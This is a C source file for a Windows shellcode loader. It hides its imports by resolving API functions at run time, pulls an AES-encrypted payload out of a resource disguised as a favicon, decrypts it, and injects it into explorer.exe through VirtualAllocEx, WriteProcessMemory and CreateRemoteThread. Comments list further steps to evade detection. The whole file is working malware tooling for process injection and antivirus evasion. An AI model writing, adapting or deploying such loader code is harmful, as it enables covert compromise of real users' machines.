// X dynamically resolve all function calls
// - dynamically resolve GetProcAddress, GetModuleAddress
// - remove all imports
// - obfuscate strings (use different key)

#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include "resources.h"
#include "helpers.h"

char key[] = "mysecretkeee";

// TODO: Change this somehow
// Load crypto module, does not get loaded when none of the functions are being statically resolved
typedef HMODULE (WINAPI * LoadLibrary_t)(LPCSTR lpFileName);
LoadLibrary_t p_LoadLibraryA = (LoadLibrary_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "LoadLibraryA");
HMODULE hCryptModule = p_LoadLibraryA("ADVAPI32.DLL");

// Resolved functions
typedef HRSRC (WINAPI * FindResource_t)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
typedef HGLOBAL (WINAPI * LoadResource_t)(HMODULE hModule, HRSRC hResInfo);
typedef LPVOID (WINAPI * LockResource_t)(HGLOBAL hResData);
typedef DWORD (WINAPI * SizeofResource_t)(HMODULE hModule, HRSRC hResInfo);
typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef VOID (WINAPI * RtlMoveMemory_t)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);
typedef LPVOID (WINAPI * OpenProcess_t)(DWORD dwDesiredAccess,BOOL bInheritHandle, DWORD dwProcessId);
typedef VOID (WINAPI * CloseHandle_t)(HANDLE hObject);
typedef LPVOID (WINAPI * VirtualAllocEx_t)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI * WriteProcessMemory_t)(HANDLE  hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
typedef HANDLE (WINAPI * CreateRemoteThread_t)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef BOOL (WINAPI * WaitForSingleObject_t)(HANDLE hHandle, DWORD dwMilliseconds);
typedef HANDLE (WINAPI * CreateToolhelp32Snapshot_t)(DWORD dwFlags, DWORD th32ProcessID);
typedef BOOL (WINAPI * Process32First_t)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef BOOL (WINAPI * Process32Next_t)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef int (WINAPI * lstrcmpiA_t)(LPCSTR lpString1, LPCSTR lpString2);
typedef BOOL (WINAPI * CryptAcquireContextW_t)(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
typedef BOOL (WINAPI * CryptCreateHash_t)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH *phHash);
typedef BOOL (WINAPI * CryptHashData_t)(HCRYPTHASH hHash, const BYTE *pbData, DWORD dwDataLen, DWORD dwFlags);
typedef BOOL (WINAPI * CryptDeriveKey_t)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTHASH hBaseData, DWORD dwFlags, HCRYPTKEY *phKey);
typedef BOOL (WINAPI * CryptDecrypt_t)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);
typedef BOOL (WINAPI * CryptReleaseContext_t)(HCRYPTPROV hProv, DWORD dwFlags);
typedef BOOL (WINAPI * CryptDestroyHash_t)(HCRYPTHASH hHash);
typedef BOOL (WINAPI * CryptDestroyKey_t)(HCRYPTKEY hKey);

// Globally used function
CloseHandle_t pCloseHandle = (CloseHandle_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "CloseHandle");

void XOR(char *data, size_t data_len, char *key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW_t pCryptAcquireContextW = (CryptAcquireContextW_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptAcquireContextW");
    CryptCreateHash_t pCryptCreateHash = (CryptCreateHash_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptCreateHash");
    CryptHashData_t pCryptHashData = (CryptHashData_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptHashData");
    CryptDeriveKey_t pCryptDeriveKey = (CryptDeriveKey_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptDeriveKey");
    CryptDecrypt_t pCryptDecrypt = (CryptDecrypt_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptDecrypt");
    CryptReleaseContext_t pCryptReleaseContext = (CryptReleaseContext_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptReleaseContext");
    CryptDestroyHash_t pCryptDestroyHash = (CryptDestroyHash_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptDestroyHash");
    CryptDestroyKey_t pCryptDestroyKey = (CryptDestroyKey_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptDestroyKey");

    if (!pCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
        return -1;
    }
    if (!pCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
        return -1;
    }
    if (!pCryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
        return -1;              
    }
    if (!pCryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
        return -1;
    }
    
    if (!pCryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
        return -1;
    }
    
    pCryptReleaseContext(hProv, 0);
    pCryptDestroyHash(hHash);
    pCryptDestroyKey(hKey);
    
    return 0;
}

int FindTarget(const char *procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    CreateToolhelp32Snapshot_t pCreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "CreateToolhelp32Snapshot");
    Process32First_t pProcess32First = (Process32First_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "Process32First");
    Process32Next_t pProcess32Next = (Process32Next_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "Process32Next");
    lstrcmpiA_t plstrcmpiA = (lstrcmpiA_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "lstrcmpiA");
            
    hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
            
    pe32.dwSize = sizeof(PROCESSENTRY32); 
            
    if (!pProcess32First(hProcSnap, &pe32)) {
            CloseHandle(hProcSnap);
            return 0;
    }
            
    while (pProcess32Next(hProcSnap, &pe32)) {
            if (plstrcmpiA(procname, pe32.szExeFile) == 0) {
                    pid = pe32.th32ProcessID;
                    break;
            }
    }
            
    CloseHandle(hProcSnap);
            
    return pid;
}

int Inject(HANDLE hProc, unsigned char *payload, unsigned int payload_len) {

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;
    DWORD oldProtect = 0;

    VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "VirtualAllocEx");
    WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "WriteProcessMemory");
    CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "CreateRemoteThread");
    WaitForSingleObject_t pWaitForSingleObject = (WaitForSingleObject_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "WaitForSingleObject");

    pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    pWriteProcessMemory(hProc, pRemoteCode, payload, payload_len, NULL);
    
    hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);

    if (hThread != NULL) {
            pWaitForSingleObject(hThread, -1);
            pCloseHandle(hThread);
            return 0;
    }
    return -1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	void * exec_mem;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char *payload;
	unsigned int payload_len;

    unsigned char AESkey[] = { 0x5a, 0xdc, 0x9c, 0xd0, 0xfd, 0x9d, 0x46, 0xc1, 0xd9, 0xe, 0xea, 0x75, 0x99, 0x1d, 0xfc, 0x9 };

    FindResource_t pFindResource = (FindResource_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "FindResourceA");
    LoadResource_t pLoadResource = (LoadResource_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "LoadResource");
    LockResource_t pLockResource = (LockResource_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "LockResource");
    SizeofResource_t pSizeofResource = (SizeofResource_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "SizeofResource");
    VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "VirtualAlloc");
    RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "RtlMoveMemory");
    OpenProcess_t pOpenProcess = (OpenProcess_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "OpenProcess");

	// Extract payload from resources section
	res = pFindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = pLoadResource(NULL, res);
	payload = (unsigned char *) pLockResource(resHandle);
	payload_len = pSizeofResource(NULL, res);

	// Allocate some memory buffer for payload
	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Decrypt payload
    AESDecrypt((char *)payload, payload_len, (char *)AESkey, sizeof(AESkey));

	// Copy payload to new memory buffer
	pRtlMoveMemory(exec_mem, payload, payload_len);

	// Injecton process
	int pid = 0;
    HANDLE hProc = NULL;

	pid = FindTarget("explorer.exe");

	if (pid) {
		// try to open target process
		hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Inject(hProc, (unsigned char *)exec_mem, payload_len);
			pCloseHandle(hProc);
		}
	}

	return 0;
}